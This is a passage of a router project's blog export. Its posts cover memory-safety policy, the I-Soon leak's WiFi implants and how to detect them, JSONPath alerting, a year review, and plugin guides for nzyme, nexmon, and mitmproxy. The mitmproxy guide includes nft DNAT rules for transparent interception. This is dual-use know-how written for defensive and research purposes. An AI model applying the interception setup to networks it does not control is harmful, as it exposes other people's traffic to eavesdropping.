      x = packet.build()\\n            sys.stdout.buffer.write(struct.pack(\\"<L\\", len(x)) + x)\\n            sys.stdout.buffer.flush()\\n            return\\n        assert self.mode == \\"iface\\"\\n        sendp(packet, iface=self.iface, verbose=False)\\n\\n\\nif __name__ == \\"__main__\\":\\n    ap = AP(mode=\\"iface\\", iface=\\"wlan1\\", channel=1)\\n    ap.run()\\n```"},{"id":"federal-focus-memory-corruption-2024","metadata":{"permalink":"/pages/blog/federal-focus-memory-corruption-2024","source":"@site/blog/2024-03-01-vantage-point.md","title":"Software Safety Looks Different From The Other Side","description":"Memory Corruption Hardening is Controversial Now?","date":"2024-03-01T00:00:00.000Z","tags":[{"inline":true,"label":"usgov","permalink":"/pages/blog/tags/usgov"},{"inline":true,"label":"fedgov","permalink":"/pages/blog/tags/fedgov"},{"inline":true,"label":"memory-corruption","permalink":"/pages/blog/tags/memory-corruption"},{"inline":true,"label":"safety","permalink":"/pages/blog/tags/safety"}],"readingTime":3.255,"hasTruncateMarker":true,"authors":[{"name":"Alex Radocea","url":"https://twitter.com/defendtheworld","key":"ltsrad","page":null}],"frontMatter":{"slug":"federal-focus-memory-corruption-2024","title":"Software Safety Looks Different From The Other Side","authors":["ltsrad"],"tags":["usgov","fedgov","memory-corruption","safety"]},"unlisted":false,"prevItem":{"title":"Beacon Double Free in IWD","permalink":"/pages/blog/beacon-double-free-inet-wireless-daemon-CVE-2024-28084"},"nextItem":{"title":"What the I-Soon Leak Tells Us About WiFi Hacking","permalink":"/pages/blog/isoon-wifi-exploitation-2024"}},"content":"## Memory Corruption Hardening is Controversial Now?\\n\\nSocial Media has a lot of criticism lately for the push for memory safety as a metric for the labeling of software security.\\nBetween software supply chain susceptibility, command injection, and logic bugs obliterating software regularly,\\nit doesn\'t seem like its the best candidate for a software safety metric.\\n\\nThe background for why the federal government is reporting in the area is [E.O. 14028](https://www.whitehouse.gov/briefing-room/presidential-actions/2021/05/12/executive-order-on-improving-the-nations-cybersecurity/)\\n\\nFrom the EO there\'s several pushes for software and network safety. These are things like requiring Zero Trust Access for the Federal Government, EDR on federal systems for monitoring and responding to attacks,  SBOMs for supply chain safety, and creating safety standards for IOT devices. Although the main focus is the federal government there\'s an aim to push out software safety standards to the public as a whole.\\n\\nAnd it\'s regulation for consumers that I see getting some criticism. NIST\'s key areas interact with the labeling of safety for IOT and consumer software -- which has everyone skeptical because the government may not seem to be the best equipped for leading edge software practices, and regulatory overhead will raise the burden for software developers without necessarily moving software security forward.\\n\\n![nist-timeline](https://www.nist.gov/sites/default/files/images/2022/04/27/EO-task_and-timeline.png)\\n\\nOn memory safety specifically, two key documents have been released over the past two quarters. The first is [CISA\'s report on Memory Safety](https://www.cisa.gov/sites/default/files/2023-12/The-Case-for-Memory-Safe-Roadmaps-508c.pdf).\\nThe second is the [ONCD Report on Measuring Memory Safety](https://www.whitehouse.gov/wp-content/uploads/2024/02/Final-ONCD-Technical-Report.pdf).\\n\\n\x3c!-- truncate --\x3e\\n\\n## Software Looks Very Fragile When You\'re Good At Exploitation\\n\\nMy take on memory safety is that it looks a lot more urgent from the vantage point of an organization with a fully stocked arsenal. Many pieces of software really start to look like an open door. And there\'s just a lot they see the public doesn\'t have regular access to.\\n\\nTo an individual or even a team of defenders at a top 10 tier tech company, things might seem a lot less urgent than they do the whitehouse because exploitation has become difficult. We\'ve come quite a long way since [Operation Aurora](https://en.wikipedia.org/wiki/Operation_Aurora) where attackers could spray the 32-bit address space with nops and shellcode to execute code. Between 64-bit address spaces, CFI, ASLR, memory tagging, MTE, shadow stacks, EDR kernel sensors, single-process unikernels, scanners in security coprocessors, yes -- whole swathes of crashes are made interceptable, unexploitable, or vastly unreliable.\\n\\nIt takes whole teams to make successful exploit chains against rich and common attack surfaces. However, if the cost of not having a capability is more than the price of making it, it becomes increasing probable that an exploit will exist until software begins to be fundamentally secure. Ten million, fifty million, a hundred million dollars seems like a ton of money for an exploit chain that\'s one patch away from disappearing. But to the federal government that can create trillions of dollars to solve a global crisis, that amount of funding remains a rounding error.\\n\\nLikewise, defenders at the US federal government and its partners have access to ongoing and recent attack trends. They see how attackers surreptitiously take advantage of flaws that may not always become public or fully known. To them the situation might look a lot more untenable than it does to leading edge software developers from the tech giants.\\n\\n## Defender Advantage Through Regulatory Controls\\n\\nOn one hand -- regulatory burden like we\'ve seen with GDPR in the EU can really hurt developers, as well as user experience. Does anyone feel like the EU solved privacy for citizens or do they feel more surveilled than ever? On the other hand, regulation might just be the thing that helps secure software overcome the marketing department at Insecure Vendor Co. or helps Ada win against C or creates a market for new architectures.\\n\\nOn performance: if we\'re cool with shipping web browsers as native apps with a million NPM packages, we\'ll probably survive okay with compilers that waste instructions."},{"id":"isoon-wifi-exploitation-2024","metadata":{"permalink":"/pages/blog/isoon-wifi-exploitation-2024","source":"@site/blog/2024-02-22-isoon-wifi.md","title":"What the I-Soon Leak Tells Us About WiFi Hacking","description":"The I Soon Dump","date":"2024-02-22T00:00:00.000Z","tags":[{"inline":true,"label":"spyware","permalink":"/pages/blog/tags/spyware"},{"inline":true,"label":"wifi","permalink":"/pages/blog/tags/wifi"},{"inline":true,"label":"implants","permalink":"/pages/blog/tags/implants"}],"readingTime":2.265,"hasTruncateMarker":true,"authors":[{"name":"Alex Radocea","url":"https://twitter.com/defendtheworld","key":"ltsrad","page":null}],"frontMatter":{"slug":"isoon-wifi-exploitation-2024","title":"What the I-Soon Leak Tells Us About WiFi Hacking","authors":["ltsrad"],"tags":["spyware","wifi","implants"]},"unlisted":false,"prevItem":{"title":"Software Safety Looks Different From The Other Side","permalink":"/pages/blog/federal-focus-memory-corruption-2024"},"nextItem":{"title":"Alerts to Improve Network Visibility","permalink":"/pages/blog/spr-2024-alerts"}},"content":"## The I Soon Dump\\n\\n\\"The documents come from iSoon, also known as Auxun, a Chinese firm headquartered in Shanghai that sells third-party hacking and data-gathering services to Chinese government bureaus, security groups and state-owned enterprises. \\"\\n\\nThe [Washington Post](https://www.washingtonpost.com/world/2024/02/21/china-hacking-leak-documents-isoon/) writes that\\n\\"The documents show that iSoon met and worked with members of APT41, a Chinese hacking group that was charged by the U.S. Justice Department in 2020 for targeting more than 100 video game firms, universities and other victims worldwide.\\"\\n\\n\x3c!-- truncate --\x3e\\n\\n## WiFi Capability: Hardware Implants\\n\\nThe dump has a product catalogue that starting from page 18, describes hardware implants for persistent access to target environments. These implants are used for accessing a victim network without having to evade\\noutbound proxies or firewalls, where security monitoring might take place. So they can attack the squishy inside\\ndirectly.\\n\\nThey communicate to targets over WiFi and exfiltrate over 3G/4G.\\n\\n![implantable-device](/img/isoon/12756724-394c-4576-b373-7c53f1abbd94_22.png)\\n\\n- They are small, portable, and have 3G/4G internet connectivity\\n- They can be powered or run on a 10A battery that lasts 8-20 hours depending on activity\\n- They can be embedded into a decoy power bank or other device\\n\\n### WiFi Attack System\\n\\nAttackers can also connect into the sensors over 4G connectivity and then attack the environment over WiFi.\\nIt has standard capabilities one finds in tools like Kali Linux.\\n\\n![wifi-software-kit](/img/isoon/d5ff8b65-db15-418a-b33e-169498d79110_12.png)\\n\\n- WEP/WPS/WPA/WPA2 cracking\\n- Cracking can also be done via a more powerful cloud system\\n- Once on a network the device can inspect packets for hashes\\n- Once on a network the device can brute force login credentials for routers\\n- The device can proxy traffic to the local network\\n\\nUniquely:\\n- The device can self destruct\\n\\n### What\'s Not in The Dump\\n\\nWhat we don\'t see a cache of ready to go router exploits, patched or unpatched,\\nas well as software/firmware capabilities for unpatched IOT devices which are soft\\ntargets on wifi.\\n\\n\\n### Closing Thoughts on Detection\\n\\n- Nothing in the documents hits on masquerading implants by MAC address. A good asset inventory might go a long way when the device joins the network\\n- Tools like [Nzyme](https://www.nzyme.org/) can help detect WiFi Cracking attempts as well as detect rogue APs in the environment. SPR supports [nzyme taps](https://github.com/spr-networks/spr-nzyme-tap/)\\n- Building a baseline of WiFi APs would be the best way a defender can detect a WiFi Implant entering the environment\\n- Defenders need internal network sensors as well as sensors on the outbound network\\n- A zero-trust network setup would help mitigate this type of implant reaching an asset\'s networked resources, but would still leave client devices vulnerable to Rogue AP attacks unless they employ zero-trust principles for WiFi connectivity (like EAP-TLS/EAP-TTLS or per-device WPA3 personal passwords)"},{"id":"spr-2024-alerts","metadata":{"permalink":"/pages/blog/spr-2024-alerts","source":"@site/blog/2024-01-31-we-have-alerts.md","title":"Alerts to Improve Network Visibility","description":"Alerting Made Easy","date":"2024-01-31T00:00:00.000Z","tags":[{"inline":true,"label":"SPR","permalink":"/pages/blog/tags/spr"},{"inline":true,"label":"alerts","permalink":"/pages/blog/tags/alerts"},{"inline":true,"label":"jpath","permalink":"/pages/blog/tags/jpath"},{"inline":true,"label":"events","permalink":"/pages/blog/tags/events"}],"readingTime":3.22,"hasTruncateMarker":true,"authors":[{"name":"Alex Radocea","url":"https://twitter.com/defendtheworld","key":"ltsrad","page":null}],"frontMatter":{"slug":"spr-2024-alerts","title":"Alerts to Improve Network Visibility","authors":["ltsrad"],"tags":["SPR","alerts","jpath","events"]},"unlisted":false,"prevItem":{"title":"What the I-Soon Leak Tells Us About WiFi Hacking","permalink":"/pages/blog/isoon-wifi-exploitation-2024"},"nextItem":{"title":"2023 Year in Review","permalink":"/pages/blog/spr-2023-in-review"}},"content":"## Alerting Made Easy\\n\\nWe\'ve rolled out a lightweight alerting mechanism built right inside of SPR.\\n\\nSo SPR already has an event system and we wanted to improve the existing notification system\\nas well as persist alerts for later.\\n\\nWe wanted something with the following properties:\\n* Allow powerful matching expressions\\n* Work with our lightweight key-value database for concurrent access\\n* Minimal system performance impact\\n* User Customizable, in UX with minimal coding\\n\\n\x3c!-- truncate --\x3e\\n\\n## The stack\\n\\nWe carry extensive experience building threat detection products in the infosec space.\\nTypically these have been substantial systems where event and graph databases manage petabytes of information,\\nand reports get generated as part of data pipelines or by processing during ingestion.\\n\\nWe wanted to keep it simple. So this is the stack we\'ve settled on for alerts:\\n\\n* Run alert matching during event ingestion\\n* Keep using BoltDB as a KV which scales well and is already built\\n* Use  `PaesslerAG/jsonpath` and `gval` for JSONPath expressions and evaluation\\n* Extensible later with custom operators and functions. We get this from `gval`\\n* UX with our React frontend\\n\\nFor advanced users, exporting to InfluxDB, Splunk, or ELK can be done with the `sprbus` tools or by pulling the API for events,\\nso threat detection experts can integrate SPR data into more sophisticated detection tools.\\n\\n## Expression Matching with JSONPath\\n\\nLet\'s quickly take a tour of [JSONPath](https://www.jsonpath.com).\\n\\n![alerts-custom](/img/jsonpath-image.jpg)\\n\\nJSONPath is a query syntax for matching fields of a JSON Object.\\n\\nConsider the event below\\n```json\\n{\\n  \\"MAC\\": \\"30:58:90:32:7d:e5\\",\\n  \\"Reason\\": \\"mismatch\\",\\n  \\"Status\\": \\"\\",\\n  \\"Type\\": \\"wpa\\",\\n  \\"time\\": \\"2024-02-02T04:10:19.511662376Z\\",\\n  \\"bucket\\": \\"wifi:auth:fail\\",\\n  \\"MeaningOfLife\\": 42\\n}\\n```\\n\\nTo retrieve the `MeaningOfLife` field, we can construct the following path:\\n\\n`$.MeaningOfLife` which returns `42`.\\n\\nLooking at the basic operators for JSONPath, its very much built to recurse objects and iterate through arrays.\\n![alerts-custom](/img/jsonpath-com.jpg)\\n\\nSo suppose we have an array of events, we can build a filter expression to query for matches.\\n```json\\n[\\n  {\\n    \\"MAC\\": \\"30:58:90:32:7d:e5\\",\\n    \\"Reason\\": \\"mismatch\\",\\n    \\"Status\\": \\"\\",\\n    \\"Type\\": \\"wpa\\",\\n    \\"time\\": \\"2024-02-02T04:10:19.511662376Z\\",\\n    \\"bucket\\": \\"wifi:auth:fail\\",\\n    \\"MeaningOfLife\\": 42\\n  }\\n]\\n```\\n\\nTo pull out events with MeaningOfLife 42, we would apply this query:\\n\\n```JSONPath\\n$[?(@.MeaningOfLife==42)]\\n```\\n\\nWe could also use other mathematical comparisons\\n```JSONPath\\n$[?(@.MeaningOfLife>0)]\\n```\\n\\nOr with gval we can even add numbers\\n```JSONPath\\n$[?(@.MeaningOfLife>(1+10))]\\n```\\n\\nOther useful ways to match are regular expressions on strings:\\n\\n```JSONPath\\n$[?(@.Reason=~\\"^mismatch$\\")]\\n```\\n\\n### JSONPath in SPR\\n\\nThe best part is we don\'t need a SQL schema to get started. JSONPath work for all of the events in SPR.\\nIt may seem a bit intimidating at first, and we hide out some of the extra syntax `$[?@(.)]`. However,\\nthis provides a lot of flexibility and is relatively easy once you get the hang of it.\\n\\n![alerts-custom](/img/guides/alert-custom.png)\\n\\n\\nTo simplify rule writing we allow multiple JSONPath queries and provide toggles\\nfor inverting logic as well as Match One (OR) or Match Any (AND). Each JSONPath query can match on multiple fields too.\\n\\nThe JSONPath query language is also available under the events search view for searching.\\n\\n## Customizability & Decorators\\n\\n\\nAlerts can Notify in the UI or they can sit on the Alerts page for triaging. When defining an alert,\\nusers can fill out the \'Title\' and \'Body\' for the alert to display. These support a templating language,\\nfor populating text with fields from the Alert Event. Furthermore, we\'ve added a few decorators with hashtags\\nto convert identifiers to device icons or go from something like a MAC address to a device name or IP Address.\\n\\nTemplates expand event fields inside of curly brackets as elow:\\n` MAC Mismatch IP Violation {{IP.SrcIP#Device}} {{IP.SrcIP}} {{Ethernet.SrcMAC}} to {{IP.DstIP}} {{Ethernet.DstMAC}}`\\n\\nCheck out the guide for more details about [how to configure alerts](/pages/docs/guides/alerts).\\n\\n## Need a feature?\\n\\nIf you\'d like to see more added or have a question, don\'t hesitate to file a github issue or reach out on our discord\\n\\n![alerts-overview](/img/guides/alerts-overview.png)"},{"id":"spr-2023-in-review","metadata":{"permalink":"/pages/blog/spr-2023-in-review","source":"@site/blog/2023-12-27-year-in-review.md","title":"2023 Year in Review","description":"What a year it\'s been for the Secure Programmable Router (SPR) project! We\'ve made great strides in empowering users to take control of their networks, prioritize privacy, and unlock network configurability. Let\'s dive right into the highlights of 2023 and peek at what\'s in store for the future.","date":"2023-12-27T00:00:00.000Z","tags":[{"inline":true,"label":"SPR","permalink":"/pages/blog/tags/spr"},{"inline":true,"label":"IOS","permalink":"/pages/blog/tags/ios"},{"inline":true,"label":"microsegmentation","permalink":"/pages/blog/tags/microsegmentation"},{"inline":true,"label":"PLUS","permalink":"/pages/blog/tags/plus"}],"readingTime":4.095,"hasTruncateMarker":true,"authors":[{"name":"Alex Radocea","url":"https://twitter.com/defendtheworld","key":"ltsrad","page":null},{"name":"Philip Olausson","url":"https://twitter.com/capslcc","key":"ltspo","page":null}],"frontMatter":{"slug":"spr-2023-in-review","title":"2023 Year in Review","authors":["ltsrad","ltspo"],"tags":["SPR","IOS","microsegmentation","PLUS"]},"unlisted":false,"prevItem":{"title":"Alerts to Improve Network Visibility","permalink":"/pages/blog/spr-2024-alerts"},"nextItem":{"title":"Loading an nzyme tap on SPR","permalink":"/pages/blog/spr-nzyme-tap"}},"content":"**What a year it\'s been for the Secure Programmable Router (SPR) project!** We\'ve made great strides in empowering users to take control of their networks, prioritize privacy, and unlock network configurability. Let\'s dive right into the highlights of 2023 and peek at what\'s in store for the future.\\n\\n![device-list](/img/year-in-review/demo-screenshot.png)\\n\\n\\n\x3c!-- truncate --\x3e\\n\\n### Major Accomplishments:\\n\\n* **iOS App Launch:** We\'ve extended network management to your fingertips with the release of our official [iOS app on the App Store](https://apps.apple.com/us/app/secure-programmable-router/id6443709201). We\'re thankful to our users from almost each and every region on the App Store.\\n* **PLUS Membership:** Our community now has the option to support the project [with PLUS](https://www.supernetworks.org/plus.html) and unlock advanced features like:\\n   - Mesh networking for seamless coverage with multiple APs\\n   - Site VPN support for selectively routing traffic through a remote Wireguard VPN\\n   - Advanced firewall rules with scheduling, domain name, and regular expression support\\n* **Shipping Dev Kits**. After the global supply chain crunch, we\'re proud to be shipping [dev kits](https://www.supernetworks.org/devkit.html) to users\\n* **Microsegmentation for Containers:** We\'ve taken SPR\'s container support to the next level with integrated container microsegmentation, enabling granular control over container and interface traffic.\\n* **VLAN Trunk Support:** SPR can work as a wired firewall as well. Connect devices to your SPR network securely through a managed switch, with SPR terminating a VLAN Trunk Port.\\n* **Expanded Network Visibility:** Our new [event bus](https://github.com/spr-networks/sprbus), database, and configurable alerting mechanism provide key insights into network activity, empowering users to detect and troubleshoot issues effectively and analyze IOT & device traffic.\\n\\n### Thank you to our users!\\n\\n* **We Build For You:** We\'re incredibly grateful for our active user base and their invaluable suggestions. Your feedback drives our development roadmap! Join the conversation on Discord or create a GitHub request to share your ideas. Many of SPR\'s capabilities come from requests. Some of the feature requests that have landed are wifi scanning from the UI, the `lan_upstream` tag for restricting and managing access to upstream local networks to enable [secure router chaining](https://www.supernetworks.org/pages/blog/secure%20router%20chaining), and load balancing support across multiple Uplink interfaces.\\n\\n* **Privacy and Ad Blocking Excellence:** SPR continues to excel as a self-hosted WireGuard + DNS Ad block solution, offering unmatched configurability with per-device rules, easy exception management, and upstream DNS over HTTPS support for enhanced privacy. Users can get these capabilities by [self hosting in the cloud](https://www.supernetworks.org/pages/blog/virtual-spr-1click) as well as running SPR at home as a router.\\n\\n* **Network Debugging Made Easy:** Users have been able to use SPR to successfully debug connectivity issues with devices like Ring cameras, pinpointing problems with Amazon\'s cloud services rather than home Wi-Fi although Ring may say otherwise.\\n\\n* **Uncovering Unauthorized Access:** Event logs have helped users identify and address unauthorized access attempts, including scenarios like accidental connections from new neighbors moving in.\\n\\n* **Speedier WiFi:** Even with our Raspberry Pi dev kits, users report impressive speeds between `500-700 Mbps` over USB3, surpassing their previous routers. With MT7915/6 cards, SPR users today can enjoy actual WiFi 6 gigabit `(1000+ Mbps)` connectivity over 2 spatial streams as measured with iperf3.\\n\\n### Technical Research:\\n\\n* **Unscathed by MacStealer:** SPR\'s design was further validated by the [MacStealer (CVE-2022-47522)](https://github.com/vanhoefm/macstealer) flaws. MacStealer bypassed most Client Isolation approaches due to state errors in low level firmware with MAC address handling. SPR\'s per-device VLAN and per-device password approach is totally immune to this category of protocol flaws.\\n\\n* **Research AP in Scapy:** We\'ve developed functional WPA2 AP research scripts in Scapy for working with Wi-Fi frames, compatible with mac80211_hwsim and real wireless cards. ([https://github.com/spr-networks/barely-ap](https://github.com/spr-networks/barely-ap)).\\n\\n* **Turtles WiFi Hacking** While waiting for the supply chain to unlock at the start of the year, we put together some wifi security training focused on protocol. We actually let people boot a kernel for a self hosted wireless lab, in the browser. Or people can play offline in containers. This is a bit different than other labs which teach people to run prebuilt software as we guide people towards working at the packet level. [Check it out here](https://www.supernetworks.org/wifiturtles.html)\\n\\n![device-list](/img/year-in-review/turtles.png)\\n\\n### 2023\'s Hardware In Pictures\\n\\n![pi4](/img/yellow-pi-case.png)\\n*Pi4 with a Mediatek MT76-based USB3 Adapter*\\n\\n![pi4](/img/clearfog.png)\\n*Solidrun Clearfog Dev Kit*\\n\\n### The Road Ahead:\\n\\n* **Empowering Plugins:** Our next major focus is facilitating community-built plugins. We\'ve already created prototypes for [Tailscale support](https://github.com/spr-networks/spr-tailscale) and [mitmproxy](https://github.com/spr-networks/spr-mitmproxy), and we\'re working on UI integration and streamlined installation to make plugin usage as seamless as possible without sacrificing security.\\n* **PI5 Router with WiFi-6:** Our next hardware device will be a a PI5-based router packaged with wifi-6 support.\\n* **Eliminating firmware risk** We\'re also [developing software](https://www.supernetworks.org/pages/blog/barely-ap-surfaces) to eliminate firmware attack surfaces with WiFi.\\n\\n**Join the Movement:**\\n\\nWe invite you to be part of the SPR journey! Contribute to development, share your feedback, and help us shape the future of open-source networking. Together, we can build a more secure, private, and customizable internet experience for everyone.\\n\\n**Visit our [website](https://www.supernetworks.rog) and [GitHub repository](https://github.com/spr-networks/super) to learn more and get involved**"},{"id":"spr-nzyme-tap","metadata":{"permalink":"/pages/blog/spr-nzyme-tap","source":"@site/blog/2023-11-16-nzyme.md","title":"Loading an nzyme tap on SPR","description":"Nzyme lets people monitor their wifi networks with sensors that collect wifi data (as well as network traffic).","date":"2023-11-16T00:00:00.000Z","tags":[{"inline":true,"label":"wifi","permalink":"/pages/blog/tags/wifi"},{"inline":true,"label":"nzyme","permalink":"/pages/blog/tags/nzyme"},{"inline":true,"label":"defense","permalink":"/pages/blog/tags/defense"},{"inline":true,"label":"blue-team","permalink":"/pages/blog/tags/blue-team"}],"readingTime":0.42,"hasTruncateMarker":true,"authors":[{"name":"Alex Radocea","url":"https://twitter.com/defendtheworld","key":"ltsrad","page":null}],"frontMatter":{"slug":"spr-nzyme-tap","title":"Loading an nzyme tap on SPR","authors":"ltsrad","tags":["wifi","nzyme","defense","blue-team"]},"unlisted":false,"prevItem":{"title":"2023 Year in Review","permalink":"/pages/blog/spr-2023-in-review"},"nextItem":{"title":"Transparent Socket Forwarding with SPR and MITMProxy","permalink":"/pages/blog/spr-mitmproxy"}},"content":"[Nzyme](https://www.nzyme.org/) lets people monitor their wifi networks with sensors that collect wifi data (as well as network traffic).\\n\\nIt can detect common wifi attack tools and tactics like deauths for getting WPA2 handshakes to crack,\\nrogue APs, and more.\\n\\nWe\'ve put together a plugin that can run alongside the SPR AP without affecting the channels, by creating a monitor interface. While this won\'t be able to detect Rogue APs, it can detect some anomalous activity.\\n\\nThe plugin is available at [https://github.com/spr-networks/spr-nzyme-tap/](https://github.com/spr-networks/spr-nzyme-tap/)\\n\\n\x3c!-- truncate --\x3e"},{"id":"spr-mitmproxy","metadata":{"permalink":"/pages/blog/spr-mitmproxy","source":"@site/blog/2023-11-14-mitmproxy.md","title":"Transparent Socket Forwarding with SPR and MITMProxy","description":"Update","date":"2023-11-14T00:00:00.000Z","tags":[{"inline":true,"label":"mitmproxy","permalink":"/pages/blog/tags/mitmproxy"},{"inline":true,"label":"microsegmentation","permalink":"/pages/blog/tags/microsegmentation"},{"inline":true,"label":"transparent sockets","permalink":"/pages/blog/tags/transparent-sockets"},{"inline":true,"label":"PLUS","permalink":"/pages/blog/tags/plus"}],"readingTime":1.945,"hasTruncateMarker":true,"authors":[{"name":"Alex Radocea","url":"https://twitter.com/defendtheworld","key":"ltsrad","page":null}],"frontMatter":{"slug":"spr-mitmproxy","title":"Transparent Socket Forwarding with SPR and MITMProxy","authors":"ltsrad","tags":["mitmproxy","microsegmentation","transparent sockets","PLUS"]},"unlisted":false,"prevItem":{"title":"Loading an nzyme tap on SPR","permalink":"/pages/blog/spr-nzyme-tap"},"nextItem":{"title":"Loading up nexmon on a RPI4 with SPR","permalink":"/pages/blog/spr-nexmon"}},"content":"## Update\\nThis post has become a guide which is being kept up to date, [check it out!](/pages/docs/guides/guides_plus/mitmproxy)\\n\\n## Overview\\n\\nIn this post we\'ll show how PLUS members can add a `mitmproxy` plugin to their SPR setup,\\nand then use the [Programmable Firewall (PFW)](https://www.supernetworks.org/plus.html) plugin to redirect traffic through `mitmproxy` with DNAT forwarding.\\n\\nWe do not need to configure our clients with proxy settings to point to `mitmproxy`, or rewrite DNS responses,\\nsince we are using the PFW feature to do the redirection.\\n\\n[This plugin is available on github.](https://github.com/spr-networks/spr-mitmproxy)\\n\\n\x3c!-- truncate --\x3e\\n\\n### Prepare the plugin\\nfrom the SPR directory, typically `/home/spr/super`\\n```bash\\ncd plugins\\ngit clone https://github.com/spr-networks/spr-mitmproxy\\necho [\\\\\\"plugins/spr-mitmproxy/docker-compose.yml\\\\\\"] > ../configs/base/custom_compose_paths.json\\ncd spr-mitmproxy\\ndocker compose build\\n```\\n\\n### Configure SPR\\n1. Navigate to the SPR UI. Add mitmproxy under the Plugins page\\n-  be sure its been added to `configs/base/custom_compose_paths.json` as above\\n- Enable it by toggling the slider\\n![](https://github.com/spr-networks/spr-mitmproxy/assets/37549748/dcc0f1ea-724a-4ed0-856a-56444ea2569f)\\n\\n2. Add `mitmweb0` to the custom interface rules. You can verify your container\'s network address in the Container tab ->\\nUnder `Firewall-> Custom Interface Access` Add a new rule, make sure mitmproxy has `wan` at least to access the internet.\\n\\n![](https://github.com/spr-networks/spr-mitmproxy/assets/37549748/71d4c8c9-3812-452f-86df-a7d19fb703a6)\\n\\n3. Create a forwarding rule to the container web interface :8081. Pick an arbitrary IP in the subnet -- although not the same one as the container as that confuses dnat.\\n![](https://github.com/spr-networks/spr-mitmproxy/assets/37549748/ff1424c6-b6ad-48d4-8ffe-03186f61abc6)\\n\\n4. Create a site forward rule with PFW for traffic to intercept\\n![](https://github.com/spr-networks/spr-mitmproxy/assets/37549748/4d5e49b4-5860-4aad-ac17-510589ee31c5)\\n\\n### Using mitmproxy\\nThen make a curl request from any of the LAN devices, and it should populate on the mitmweb host. This was the :8081 host that was earlier defined\\n![](https://github.com/spr-networks/spr-mitmproxy/assets/37549748/a70a9f7e-91b9-4798-926b-2cb625f71e78)\\n\\n\\n## Leveraging Transparent Sockets\\n\\nBehind the scenes, `mitmproxy` is using transparent sockets with DNAT. Inside the container network,\\nwe establish dnat rules to `mitmproxy` from incoming ports `80`, `443`.\\n\\n```bash\\n#!/bin/bash\\n\\nnft -f - << EOF\\ntable inet nat {\\n        chain prerouting {\\n                type nat hook prerouting priority filter; policy accept;\\n                tcp dport { 80, 443 } dnat ip to 127.0.0.1:9999\\n        }\\n}\\nEOF\\n\\nmitmweb -p 9999 -m transparent --web-host 0.0.0.0\\n```\\n\\n## We\'d love to hear from you\\n\\nWe\'re always thrilled to get feedback on plugins people would like to see, and we\'re\\nexcited to hear about what people will be able to do with `mitmproxy` running\\nalongside SPR. Drop a line at [outreach[at]supernetworks.org](mailto:outreach+s@supernetworks.org) or join us on [discord](https://discord.com/invite/EUjTKJPPAX)"},{"id":"spr-nexmon","metadata":{"permalink":"/pages/blog/spr-nexmon","source":"@site/blog/2023-11-1-nexmon-spr.md","title":"Loading up nexmon on a RPI4 with SPR","description":"The built-in wifi radio on a Raspberry Pi 4 is kind of sad, as it does not support monitor mode.","date":"2023-11-01T00:00:00.000Z","tags":[{"inline":true,"label":"Raspberry Pi","permalink":"/pages/blog/tags/raspberry-pi"},{"inline":true,"label":"Python","permalink":"/pages/blog/tags/python"},{"inline":true,"label":"Scapy","permalink":"/pages/blog/tags/scapy"},{"inline":true,"label":"WiFi","permalink":"/pages/blog/tags/wi-fi"},{"inline":true,"label":"Linux","permalink":"/pages/blog/tags/linux"},{"inline":true,"label":"Nexmon","permalink":"/pages/blog/tags/nexmon"},{"inline":true,"label":"Seemoo Labs","permalink":"/pages/blog/tags/seemoo-labs"}],"readingTime":4.69,"hasTruncateMarker":true,"authors":[{"name":"Alex Radocea","url":"https://twitter.com/defendtheworld","key":"ltsrad","page":null}],"frontMatter":{"slug":"spr-nexmon","title":"Loading up nexmon on a RPI4 with SPR","authors":"ltsrad","tags":["Raspberry Pi","Python","Scapy","WiFi","Linux","Nexmon","Seemoo Labs"]},"unlisted":false,"prevItem":{"title":"Transparent Socket Forwarding with SPR and MITMProxy","permalink":"/pages/blog/spr-mitmproxy"},"nextItem":{"title":"Attack Surface Reduction Research (Part 1)","permalink":"/pages/blog/barely-ap-surfaces"}},"content":"The built-in wifi radio on a Raspberry Pi 4 is kind of sad, as it does not support monitor mode.\\nLuckily the hackers at Seemo Labs have fixed this.\\n\\nIn this post we\'ll describe how to load Seemoo\'s Nexmon onto a pi4 running a modern kernel, and package it into a SPR Plugin\\nnamed  [spr-nexmon](https://github.com/spr-networks/spr-nexmon/tree/main). We\'ll demonstrate that packet capture and injection works.\\n\\n\x3c!-- truncate --\x3e\\n\\n## First, we will copy the template plugin\\n\\n```shell-session\\n$ cp -R super/api_sample_plugin/ spr-nexmon\\n```\\n\\n## Development\\n\\n### Prebuilt binaries\\n\\nWe\'ll use some prebuilt binaries that include\\n- the nexmon firmware build for the broadcom wifi radio\\n- the 6.2 kernel build\\n- the nexutil binary\\n\\nThese were built from the [6.1/6.2 support pull-request](https://github.com/seemoo-lab/nexmon/compare/master...DrSchottky:nexmon:rpi-6.1.y)\\n\\n```shell-session\\n$ cp -R ../nexmon/binaries spr-nexmon/binaries\\n```\\n\\n### Docker preparations\\n\\nWe\'ll update the Dockerfile to include some useful tools and build the project.\\n\\n```docker\\nFROM ubuntu:23.04 as builder\\nENV DEBIAN_FRONTEND=noninteractive\\nRUN apt-get update\\nRUN apt-get install -y --no-install-recommends nano ca-certificates git curl\\nRUN mkdir /code\\nWORKDIR /code\\nARG TARGETARCH\\nRUN curl -O https://dl.google.com/go/go1.20.linux-${TARGETARCH}.tar.gz\\nRUN rm -rf /usr/local/go && tar -C /usr/local -xzf go1.20.linux-${TARGETARCH}.tar.gz\\nENV PATH=\\"/usr/local/go/bin:$PATH\\"\\nCOPY code/ /code/\\n\\nARG USE_TMPFS=true\\nRUN --mount=type=tmpfs,target=/tmpfs \\\\\\n    [ \\"$USE_TMPFS\\" = \\"true\\" ] && ln -s /tmpfs /root/go; \\\\\\n    go build -ldflags \\"-s -w\\" -o /nexmon_plugin /code/nexmon_plugin.go\\n\\n\\nFROM ghcr.io/spr-networks/container_template:latest\\nENV DEBIAN_FRONTEND=noninteractive\\nRUN apt-get update && apt-get install -y --no-install-recommends tcpdump kmod iw wireless-regdb && rm -rf /var/lib/apt/lists/*\\nCOPY scripts /scripts/\\nCOPY --from=builder /nexmon_plugin /\\nCOPY binaries/ nexmon/\\nENTRYPOINT [\\"/scripts/startup.sh\\"]\\n```\\n\\nWe also want this container to use the host network and be privileged so it\\ncan load kernel modules. And we\'ll also set it to restart automatically\\n\\nAnd heres the docker-compose.yml:\\n\\n```yaml\\nversion: \'3.4\'\\n\\nx-logging:\\n  &default-logging\\n  driver: journald\\n\\nx-labels:\\n  &default-labels\\n  org.supernetworks.ci: ${CI:-false}\\n  org.supernetworks.version: ${RELEASE_VERSION:-latest}${RELEASE_CHANNEL:-}\\n\\nservices:\\n  nexmon:\\n    container_name: supernexmon\\n    build:\\n      context: .\\n      labels: *default-labels\\n    logging: 